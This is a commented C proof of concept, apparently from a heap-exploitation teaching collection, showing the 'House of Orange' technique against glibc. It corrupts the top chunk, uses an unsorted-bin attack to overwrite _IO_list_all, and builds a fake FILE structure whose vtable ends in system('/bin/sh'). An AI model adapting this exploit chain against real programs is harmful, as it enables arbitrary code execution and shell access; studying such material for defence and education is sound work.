#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
*/

/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*/
int winner ( char *ptr);

int main()
{
    char *p1, *p2;
    size_t io_list_all, *top;

    /*
      Firstly, lets allocate a chunk on the heap.
    */

    p1 = malloc(0x400-16);

    /* 
       The heap is usually allocated with a top chunk of size 0x21000
       Since we've allocate a chunk of size 0x400 already,
       what's left is 0x20c01

       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    /* 
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free
    */

    p2 = malloc(0x1000);
    /*
      Note that this chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap's end
      
      The idea is to overwrite the _IO_list_all pointer with a fake file pointer.
      The address of the pointer can be calculated from the fd and bk of the free chunk.
    */
    
    io_list_all = top[2] + 0x9a8;

    /*
      We plan to overwrite the fd and bk pointers of the old top 
      which has now been added to the unsorted bins.
     
      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with an address in the arena.

      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
      So, we should set chunk->bk to be io_list_all - 16
    */
 
    top[3] = io_list_all - 0x10;

    /*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
    */

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    /*
      The function _IO_flush_all_lockp iterates through every file pointer.
      The address of the next file pointer is located at base_address+0x68.

      Since we can only overwrite _IO_list_all with the address of the main_arena+88
      we can try to make sure that main_arena+192 is under our control.
       
      This can be done if the size of the chunk that is to be splitted is of size 0x61.
    */

    top[1] = 0x61;
   
    /*
      Now comes the part where we satisfy the constraints required by the function
      _IO_flush_all_lockp.
       
       1) base_address+0xc0 == 1
    */

    top[24] = 1;
    
    /*
      2) We require two integers such that they are adjacent and the first is smaller
    */

    top[21] = 2;
    top[22] = 3;

    /*
      3) base_address+0xa0 should contain a pointer that contains
         mentioned variables at offsets 0x18 and 0x20
    */

    top[20] = (size_t) &top[18];

    /*
      4) base_address+0xd8 = jump_table
         4-a) jump_table+0x18 == system
    */

    top[15] = (size_t) &winner;
    top[27] = (size_t ) &top[12];
    
    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    return 0;
}
